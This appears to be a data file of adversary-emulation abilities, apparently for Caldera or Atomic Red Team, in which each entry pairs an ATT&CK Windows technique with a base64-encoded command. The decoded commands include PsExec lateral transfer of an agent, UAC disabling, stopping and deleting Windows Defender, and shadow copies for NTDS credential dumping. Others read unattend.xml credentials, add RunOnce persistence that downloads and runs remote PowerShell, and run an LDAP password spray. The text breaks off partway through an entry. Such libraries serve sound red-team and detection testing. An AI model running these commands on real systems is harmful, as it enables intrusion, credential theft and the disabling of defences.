"bmV0IC95IHVzZSBcXCN7cmVtb3RlLmhvc3QubmFtZX0gJiBjb3B5IC95IHNhbmRjYXQuZ28td2luZG93c1xcI3tyZW1vdGUuaG9zdC5uYW1lfVxVc2Vyc1xQdWJsaWMgJiAje3BzZXhlYy5wYXRofSAtYWNjZXB0ZXVsYSBcXCN7cmVtb3RlLmhvc3QubmFtZX1jbWQgL2Mgc3RhcnQgQzpcVXNlcnNcUHVibGljXHNhbmRjYXQuZ28td2luZG93cyAtc2VydmVyICN7c2VydmVyfSAtdg==", "ability_id": "620b674a-7655-436c-b645-bc3e8ea51abd", "technique_name": "Lateral Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1570", "platform": "windows", "name": "Copy Sandcat File using PsExec on CMD", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["sandcat.go-windows"], "cleanup": ["ZGVsIC9mIHNhbmRjYXQuZ28td2luZG93cyAmJiBkZWwgL2YgXFwje3JlbW90ZS5ob3N0Lm5hbWV9XFVzZXJzXFB1YmxpY1xzYW5kY2F0LmdvLXdpbmRvd3MuZXhl"], "executor": "cmd", "access": {}, "description": "Copy Sandcat file using PsExec on CMD", "variations": []}, {"test": "bmV0LmV4ZSBzdGFydCA+PiBDOlxXaW5kb3dzXFRlbXBcc2VydmljZS1saXN0LnR4dA==", "ability_id": "9d03c91bdae5a80f17f89c987942b5a8", "technique_name": "System Service Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1007", "platform": "windows", "name": "System Service Discovery - net.exe", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9mIC9xIC9zIEM6XFdpbmRvd3NcVGVtcFxzZXJ2aWNlLWxpc3QudHh0ID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in c:\\Windows\\Temp\\service-list.txt.s\n", "variations": []}, {"test": "bWtkaXIgJXRlbXAlXFQxMTE5X2NvbW1hbmRfcHJvbXB0X2NvbGxlY3Rpb24gPm51bCAyPiYxICYmIGRpciBjOiAvYiAvcyAuZG9jeCB8IGZpbmRzdHIgL2UgLmRvY3ggJiYgZm9yIC9SIGM6ICVmIGluICgqLmRvY3gpIGRvIGNvcHkgJWYgJXRlbXAlXFQxMTE5X2NvbW1hbmRfcHJvbXB0X2NvbGxlY3Rpb24=", "ability_id": "7dfe5bd448630582b1ca2b64e0cb335a", "technique_name": "Automated Collection", "additional_info": {}, "privilege": "", "technique_id": "T1119", "platform": "windows", "name": "Automated Collection Command Prompt", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICV0ZW1wJVxUMTExOV9jb21tYW5kX3Byb21wdF9jb2xsZWN0aW9uIC9GIC9RID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n", "variations": []}, {"test": "Y29weSAwNjU1ZDFfV2luZG93c1NlcnZpY2VFeGFtcGxlLmV4ZSAiQzpcUHJvZ3JhbSBGaWxlc1x3aW5kb3dzX3NlcnZpY2UuZXhlIiAmJiBjb3B5IDA2NTVkMV9XaW5kb3dzU2VydmljZUV4YW1wbGUuZXhlICJDOlxwcm9ncmFtLmV4ZSIgJiYgc2MgY3JlYXRlICJFeGFtcGxlIFNlcnZpY2UiIGJpbnBhdGg9ICJDOlxQcm9ncmFtIEZpbGVzXHdpbmRvd3Nfc2VydmljZS5leGUiIERpc3BsYXluYW1lPSAiRXhhbXBsZSBTZXJ2aWNlIiBzdGFydD0gYXV0byAmJiBzYyBzdGFydCAiRXhhbXBsZSBTZXJ2aWNlIg==", "ability_id": "95d2a70730f322bddf62e5656ebab553", "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path", "additional_info": {}, "privilege": "", "technique_id": "T1574.009", "platform": "windows", "name": "Execution of program.exe as service with unquoted service path", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["0655d1_WindowsServiceExample.exe"], "cleanup": ["c2Mgc3RvcCAiRXhhbXBsZSBTZXJ2aWNlIiA+bnVsIDI+JjEgJiYgc2MgZGVsZXRlICJFeGFtcGxlIFNlcnZpY2UiID5udWwgMj4mMSAmJiBkZWwgIkM6XFByb2dyYW0gRmlsZXNcd2luZG93c19zZXJ2aWNlLmV4ZSIgPm51bCAyPiYxICYmIGRlbCAiQzpccHJvZ3JhbS5leGUiID5udWwgMj4mMSAmJiBkZWwgIkM6XFRpbWUubG9nIiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n", "variations": []}, {"test": "SW52b2tlLUFUSFJlbW90ZUZYdkdQVURpc2FibGVtZW50Q29tbWFuZCAtTW9kdWxlTmFtZSBmb28gLU1vZHVsZVBhdGggJFBXRA==", "ability_id": "e973a33ed29e267eb4f2e895489d3899", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n", "variations": []}, {"test": "JFNlcnZlcj0je2xvZ29uc2VydmVyfTsgJFVzZXIgPSBKb2luLVBhdGggI3tkb21haW59ICN7dXNlcm5hbWV9OyAkUGFzc3dvcmQ9IiN7cGFzc3dvcmR9IjsgY21ka2V5IC9nZW5lcmljOlRFUk1TUlYvJFNlcnZlciAvdXNlcjokVXNlciAvcGFzczokUGFzc3dvcmQ7IG1zdHNjIC92OiRTZXJ2ZXI7IGVjaG8gIlJEUCBjb25uZWN0aW9uIGVzdGFibGlzaGVkIg==", "ability_id": "2a3209689a6452c07f869f45414cbb4c", "technique_name": "Remote Services: Remote Desktop Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1021.001", "platform": "windows", "name": "RDP to DomainController", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JHA9VGFza2xpc3QgL3N2YyAvZmkgIklNQUdFTkFNRSBlcSBtc3RzYy5leGUiIC9mbyBjc3YgfCBjb252ZXJ0ZnJvbS1jc3Y7IGlmKC1ub3QgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRwLlBJRCkpKSB7IFN0b3AtUHJvY2VzcyAtSWQgJHAuUElEIH0="], "executor": "psh", "access": {}, "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxiaXRzYWRtaW4uZXhlIC90cmFuc2ZlciBxY3hqYjcgL1ByaW9yaXR5IEhJR0ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvTElDRU5TRS50eHQgJXRlbXAlXEF0b21pYy1saWNlbnNlLnR4dA==", "ability_id": "a10864b969f046cb33ee9e4bb2cc1942", "technique_name": "Ingress Tool Transfer", "additional_info": {}, "privilege": "", "technique_id": "T1105", "platform": "windows", "name": "Windows - BITSAdmin BITS Download", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n", "variations": []}, {"test": "IiVwcm9ncmFtZmlsZXMlL1dpblJBUi9SYXIuZXhlIiBhIC1yICVVU0VSUFJPRklMRSVcVDE1NjAuMDAxLWRhdGEucmFyICVVU0VSUFJPRklMRSVcKi50eHQ=", "ability_id": "e80cda00a39d2947a69c109256130b30", "technique_name": "Archive Collected Data: Archive via Utility", "additional_info": {}, "privilege": "", "technique_id": "T1560.001", "platform": "windows", "name": "Compress Data for Exfiltration With Rar", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9mIC9xIC9zICVVU0VSUFJPRklMRSVcVDE1NjAuMDAxLWRhdGEucmFyID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n", "variations": []}, {"test": "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgJHNjcmVlbiA9IFtXaW5kb3dzLkZvcm1zLlN5c3RlbUluZm9ybWF0aW9uXTo6VmlydHVhbFNjcmVlbjsgJGJpdG1hcCA9IE5ldy1PYmplY3QgRHJhd2luZy5CaXRtYXAgJHNjcmVlbi5XaWR0aCwgJHNjcmVlbi5IZWlnaHQ7ICRncmFwaGljID0gW0RyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJpdG1hcCk7ICRncmFwaGljLkNvcHlGcm9tU2NyZWVuKCRzY3JlZW4uTGVmdCwgJHNjcmVlbi5Ub3AsIDAsIDAsICRiaXRtYXAuU2l6ZSk7ICRiaXRtYXAuU2F2ZSgiJGVudjpURU1QXFQxMTEzLnBuZyIp", "ability_id": "54566c2f19ed9134b127d088ec2ff3a6", "technique_name": "Screen Capture", "additional_info": {}, "privilege": "", "technique_id": "T1113", "platform": "windows", "name": "Windows Screen Capture (CopyFromScreen)", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxMTEzLnBuZyAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n", "variations": []}, {"test": "cmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXENhcGFiaWxpdHlBY2Nlc3NNYW5hZ2VyXENvbnNlbnRTdG9yZVx3ZWJjYW1cTm9uUGFja2FnZWRcQzojV2luZG93cyNUZW1wI2F0b21pYy5leGUgL3YgTGFzdFVzZWRUaW1lU3RhcnQgL3QgUkVHX0JJTkFSWSAvZCBhMjczYjZmMDcxMDRkNjAxIC9mICYmIHJlZyBhZGQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxDYXBhYmlsaXR5QWNjZXNzTWFuYWdlclxDb25zZW50U3RvcmVcd2ViY2FtXE5vblBhY2thZ2VkXEM6I1dpbmRvd3MjVGVtcCNhdG9taWMuZXhlIC92IExhc3RVc2VkVGltZVN0b3AgL3QgUkVHX0JJTkFSWSAvZCA5NmVmNTE0YjcyMDRkNjAxIC9m", "ability_id": "da86001b5081fcf773d8e62f22cf2b00", "technique_name": "Video Capture", "additional_info": {}, "privilege": "", "technique_id": "T1125", "platform": "windows", "name": "Registry artefact when application use webcam", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIERFTEVURSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXENhcGFiaWxpdHlBY2Nlc3NNYW5hZ2VyXENvbnNlbnRTdG9yZVx3ZWJjYW1cTm9uUGFja2FnZWRcQzojV2luZG93cyNUZW1wI2F0b21pYy5leGUgL2Y="], "executor": "cmd", "access": {}, "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n", "variations": []}, {"test": "KEdldC1JdGVtUHJvcGVydHkgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxJbnRlcm5ldCBFeHBsb3JlcicpLlZlcnNpb24=", "ability_id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c", "technique_name": "Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518", "platform": "windows", "name": "Internet Explorer Version", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Determine the version of Internet Explorer running", "variations": []}, {"test": "c2xlZXAgNjA=", "ability_id": "36eecb80-ede3-442b-8774-956e906aff02", "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion", "additional_info": {}, "privilege": "", "technique_id": "T1497.003", "platform": "windows", "name": "1-min sleep", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Pause all operations to avoid making noise", "variations": []}, {"test": "SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtU2NyaXB0RW5naW5lIEpTY3JpcHQgLUlubGluZVByb3RvY29sSGFuZGxlciBBYm91dCAtTVNIVEFGaWxlUGF0aCAkZW52OndpbmRpclxzeXN0ZW0zMlxtc2h0YS5leGU=", "ability_id": "b7b12b4a8e954a5b6f1aa2a2b4690da5", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.", "variations": []}, {"test": "RW5hYmxlLVBTUmVtb3RpbmcgLUZvcmNl", "ability_id": "e643e21318c069d0a576da91650c76fe", "technique_name": "Remote Services: Windows Remote Management", "additional_info": {}, "privilege": "", "technique_id": "T1021.006", "platform": "windows", "name": "Enable Windows Remote Management", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n", "variations": []}, {"test": "TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXHBvbGljaWVzXHN5c3RlbSAtTmFtZSBFbmFibGVMVUEgLVByb3BlcnR5VHlwZSBEV29yZCAtVmFsdWUgMCAtRm9yY2U=", "ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UAC bypass registry", "requirements": [], "tactic": "privilege-escalation", "buckets": ["privilege-escalation"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Set a registry key to allow UAC bypass", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTU4OC4wMDJcYmluXEFkdmFuY2VkUnVuXGFkdmFuY2VkcnVuLmV4ZSAvRVhFRmlsZW5hbWUgIkM6XFdpbmRvd3NcU3lzdGVtMzJcc2MuZXhlIiAvV2luZG93U3RhdGUgMCAvQ29tbWFuZExpbmUgInN0b3AgV2luRGVmZW5kIiAvU3RhcnREaXJlY3RvcnkgIiIgL1J1bkFzIDggL1J1bjsgUGF0aFRvQXRvbWljc0ZvbGRlclxUMTU4OC4wMDJcYmluXEFkdmFuY2VkUnVuXGFkdmFuY2VkcnVuLmV4ZSAiQzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIiAvV2luZG93U3RhdGUgMCAvQ29tbWFuZExpbmUgInJtZGlyICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlcicgLVJlY3Vyc2UiIC9TdGFydERpcmVjdG9yeSAiIiAvUnVuQXMgOCAvUnVu", "ability_id": "ccfe47d66601ad23b61eeaf8983432f2", "technique_name": "Obtain Capabilities: Tool", "additional_info": {}, "privilege": "", "technique_id": "T1588.002", "platform": "windows", "name": "Run NirSoft AdvancedRun", "requirements": [], "tactic": "resource-development", "buckets": ["resource-development"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gUGF0aFRvQXRvbWljc0ZvbGRlclxUMTU4OC4wMDJcYmluXEFkdmFuY2VkUnVuXGFkdmFuY2VkcnVuLmV4ZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Information on NirSoft AdvancedRun and it's creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nUpon successful execution, AdvancedRun.exe will run and stop Defender and attempt to delete the Defender folder on disk. \n", "variations": []}, {"test": "KGd3bWkgLWxpc3Qgd2luMzJfc2hhZG93Y29weSkuQ3JlYXRlKCdDOlwnLCdDbGllbnRBY2Nlc3NpYmxlJyk=", "ability_id": "7429cb4be2156e271e5f1c7eafbca3f1", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Create Volume Shadow Copy with Powershell", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "variations": []}, {"test": "Q29weS1JdGVtIGRmOWU0NF9UMTU0Ni4wMTFDb21wYXREYXRhYmFzZS5zZGIgQzpcV2luZG93c1xhcHBwYXRjaFxDdXN0b21cVDE1NDYuMDExQ29tcGF0RGF0YWJhc2Uuc2RiOyBDb3B5LUl0ZW0gZGY5ZTQ0X1QxNTQ2LjAxMUNvbXBhdERhdGFiYXNlLnNkYiBDOlxXaW5kb3dzXGFwcHBhdGNoXEN1c3RvbVxDdXN0b202NFxUMTU0Ni4wMTFDb21wYXREYXRhYmFzZS5zZGI=", "ability_id": "3571488e9343065a62e25f45fe8848f0", "technique_name": "Event Triggered Execution: Application Shimming", "additional_info": {}, "privilege": "", "technique_id": "T1546.011", "platform": "windows", "name": "New shim database files created in the default shim database directory", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["df9e44_T1546.011CompatDatabase.sdb"], "cleanup": ["UmVtb3ZlLUl0ZW0gQzpcV2luZG93c1xhcHBwYXRjaFxDdXN0b21cVDE1NDYuMDExQ29tcGF0RGF0YWJhc2Uuc2RiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtIEM6XFdpbmRvd3NcYXBwcGF0Y2hcQ3VzdG9tXEN1c3RvbTY0XFQxNTQ2LjAxMUNvbXBhdERhdGFiYXNlLnNkYiAtRXJyb3JBY3Rpb24gSWdub3Jl", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJkZjllNDRfVDE1NDYuMDExQ29tcGF0RGF0YWJhc2Uuc2RiIg=="], "executor": "psh", "access": {}, "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "variations": []}, {"test": "", "ability_id": "4cd4eb44-29a7-4259-91ae-e457b283a880", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Delete payload", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICIje3BheWxvYWR9Ig=="], "executor": "psh", "access": {}, "description": "Remove a downloaded payload file", "variations": []}, {"test": "aWNhY2xzICJDOlxVc2Vyc1xQdWJsaWNcKiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=", "ability_id": "7adabb36eb9f71aedb71e4b130725638", "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "additional_info": {}, "privilege": "", "technique_id": "T1222.001", "platform": "windows", "name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["aWNhY2xzICdDOlxVc2Vyc1xQdWJsaWNcKicgL3Jlc3RvcmUgJXRlbXAlXFQxMjIyLjAwMS1mb2xkZXItcGVybXMtYmFja3VwLnR4dCAvcSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n", "variations": []}, {"test": "R2V0LUl0ZW1Qcm9wZXJ0eSBIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKiB8IFNlbGVjdC1PYmplY3QgRGlzcGxheU5hbWUsIERpc3BsYXlWZXJzaW9uLCBQdWJsaXNoZXIsIEluc3RhbGxEYXRlIHwgRm9ybWF0LVRhYmxlIC1BdXRvc2l6ZTsgR2V0LUl0ZW1Qcm9wZXJ0eSBIS0xNOlxTb2Z0d2FyZVxXb3c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKiB8IFNlbGVjdC1PYmplY3QgRGlzcGxheU5hbWUsIERpc3BsYXlWZXJzaW9uLCBQdWJsaXNoZXIsIEluc3RhbGxEYXRlIHwgRm9ybWF0LVRhYmxlIC1BdXRvc2l6ZQ==", "ability_id": "b5fe84fa9fb8216512867a039a61db20", "technique_name": "Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518", "platform": "windows", "name": "Applications Installed", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n", "variations": []}, {"test": "dHlwZSBDOlxXaW5kb3dzXFBhbnRoZXJcdW5hdHRlbmQueG1sICYmIHR5cGUgQzpcV2luZG93c1xQYW50aGVyXFVuYXR0ZW5kXHVuYXR0ZW5kLnhtbA==", "ability_id": "780cde60c956ccbff24c43ff7b7e70ea", "technique_name": "Unsecured Credentials: Credentials In Files", "additional_info": {}, "privilege": "", "technique_id": "T1552.001", "platform": "windows", "name": "Access unattend.xml", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n", "variations": []}, {"test": "JFJ1bk9uY2VLZXkgPSAiSEtMTTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZSI7IHNldC1pdGVtcHJvcGVydHkgJFJ1bk9uY2VLZXkgIk5leHRSdW4iICdwb3dlcnNoZWxsLmV4ZSAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKGAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS8zNmY4M2I3MjhiYzI2YTQ5ZWFjYjA1MzVlZGM0MmJlOGMzNzdhYzU0L0FSVGlmYWN0cy9NaXNjL0Rpc2NvdmVyeS5iYXRgIikiJw==", "ability_id": "4b71ebb2f6f6a01235ba240fa40ce978", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "PowerShell Registry RunOnce", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5PbmNlIC1OYW1lICJOZXh0UnVuIiAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n", "variations": []}, {"test": "aWYgKCJOVExNIi5Ub0xvd2VyKCkgLU5vdEluIEAoIm50bG0iLCJrZXJiZXJvcyIpKSB7OyAgIFdyaXRlLUhvc3QgIk9ubHkgJ05UTE0nIGFuZCAnS2VyYmVyb3MnIGF1dGggbWV0aG9kcyBhcmUgc3VwcG9ydGVkIjsgICBleGl0IDE7IH07IDsgW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlByb3RvY29scyIpIHwgT3V0LU51bGw7ICRkaSA9IG5ldy1vYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlByb3RvY29scy5MZGFwRGlyZWN0b3J5SWRlbnRpZmllcigiJGVudjpVc2VyRG5zRG9tYWluIiwzODkpOyA7ICRwYXNzd29yZExpc3QgPSBHZXQtQ29udGVudCAtUGF0aCA1Y2I5NTVfcGFzc3dvcmRzLnR4dDsgZm9yZWFjaCAoJHBhc3N3b3JkIGluICRwYXNzd29yZExpc3QpezsgICAkY3JlZHogPSBuZXctb2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoIiRFTlY6VVNFUk5BTUUiLCAkcGFzc3dvcmQsICIkZW52OlVzZXJEbnNEb21haW4iKTsgICAkY29ubiA9IG5ldy1vYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlByb3RvY29scy5MZGFwQ29ubmVjdGlvbigkZGksICRjcmVkeiwgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5Qcm90b2NvbHMuQXV0aFR5cGVdOjpOVExNKTsgICB0cnkgezsgICAgIFdyaXRlLUhvc3QgIiBbLV0gQXR0ZW1wdGluZyAke3Bhc3N3b3JkfSBvbiBhY2NvdW50ICRFTlY6VVNFUk5BTUUuIjsgICAgICRjb25uLmJpbmQoKTsgICAgICMgaWYgY3JlZGVudGlhbHMgYXJlbid0IGNvcnJlY3QsIGl0IHdpbGwgYnJlYWsganVzdCBhYm92ZSBhbmQgZ29lcyBpbnRvIGNhdGNoIGJsb2NrLCBzbyBpZiB3ZSdyZSBoZXJlIHdlIGNhbiBkaXNwbGF5IHN1Y2Nlc3M7ICAgICBXcml0ZS1Ib3N0ICIgWyFdICRFTlY6VVNFUk5BTUU6JHtwYXNzd29yZH0gYXJlIHZhbGlkIGNyZWRlbnRpYWxzISI7ICAgfSBjYXRjaCB7OyAgICAgV3JpdGUtSG9zdCAkXy5FeGNlcHRpb24uTWVzc2FnZTs